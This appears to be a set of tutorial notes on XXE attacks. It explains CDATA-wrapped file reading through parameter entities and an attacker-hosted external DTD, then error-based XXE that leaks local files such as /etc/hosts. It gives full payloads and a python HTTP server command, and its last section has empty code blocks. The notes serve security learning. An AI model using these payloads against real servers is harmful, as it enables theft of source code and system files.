
# Problem with Basic XXE

Basic XXE may fail when:

- file contains special XML characters
    
- file is binary
    
- backend is not PHP
    
- XML parser blocks malformed XML
    

Example:

```xml
<!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
```

This may fail because PHP source contains:

- `<`
    
- `>`
    
- `&`
    

which break XML parsing.

---

# Solution → CDATA

## What is CDATA?

CDATA tells XML parser:

> treat everything as raw text

Syntax:

```xml
<![CDATA[
RAW DATA HERE
]]>
```

Inside CDATA:

- special characters are ignored
    
- parser does not process XML syntax
    

---

# Initial Idea

Wrap file content inside CDATA.

## Attempt

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

---

# Why It Fails

XML does NOT allow:

- combining internal entities
    
- with external entities
    

So this line fails:

```xml
<!ENTITY joined "&begin;&file;&end;">
```

because:

- `begin` and `end` are internal
    
- `file` is external
    

---

# Solution → Parameter Entities (`%`)

Parameter entities:

- start with `%`
    
- used inside DTD
    
- can combine external entities
    

---

# Create External DTD File

## `xxe.dtd`

```xml
<!ENTITY joined "%begin;%file;%end;">
```

This combines:

- `%begin;`
    
- `%file;`
    
- `%end;`
    

into one entity called `joined`.

---

# Host DTD File

## Create file

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

---

## Start HTTP Server

```bash
python3 -m http.server 8000
```

Now:

```bash
http://OUR_IP:8000/xxe.dtd
```

is accessible.

---

# Final XXE Payload

```xml
<!DOCTYPE email [

  <!ENTITY % begin "<![CDATA[">
  
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  
  <!ENTITY % end "]]>">
  
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  
  %xxe;
]>

<email>&joined;</email>
```

---

# What Each Line Does

## CDATA Start

```xml
<!ENTITY % begin "<![CDATA[">
```

Adds:

```xml
<![CDATA[
```

---

## Read Target File

```xml
<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
```

Reads file content.

---

## CDATA End

```xml
<!ENTITY % end "]]>">
```

Adds:

```xml
]]>
```

---

## Load External DTD

```xml
<!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
```

Fetches external DTD from attacker server.

---

## Execute External DTD

```xml
%xxe;
```

Loads:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

---

## Print Final Result

```xml
<email>&joined;</email>
```

Outputs:

```xml
<![CDATA[
(FILE CONTENT)
]]>
```

# Error-Based XXE

## Used When

- Application does NOT display XML output
    
- But DOES display XML/PHP errors
    

---

# Detect Error Handling

Send malformed XML:

```xml
<roo>
```

Or:

```xml
<email>&nonExistingEntity;</email>
```

If error appears, XXE may work.

# Malicious DTD

## xxe.dtd

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

---

# Host DTD

```bash
python3 -m http.server 8000
```

---

# XXE Payload

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

---

# Working

## Read File

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
```

Loads file into `%file;`

---

## Trigger Error

```xml
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

- `%nonExistingEntity;` does not exist
    
- parser throws error
    
- error includes `%file;`
    
- file content leaks

# Read Source Code

Change:


to:

```xml

```

---

# Flow

1. Host malicious DTD
    
2. Target loads DTD
    
3. DTD reads local file
    
4. Invalid entity causes error
    
5. Error leaks file content
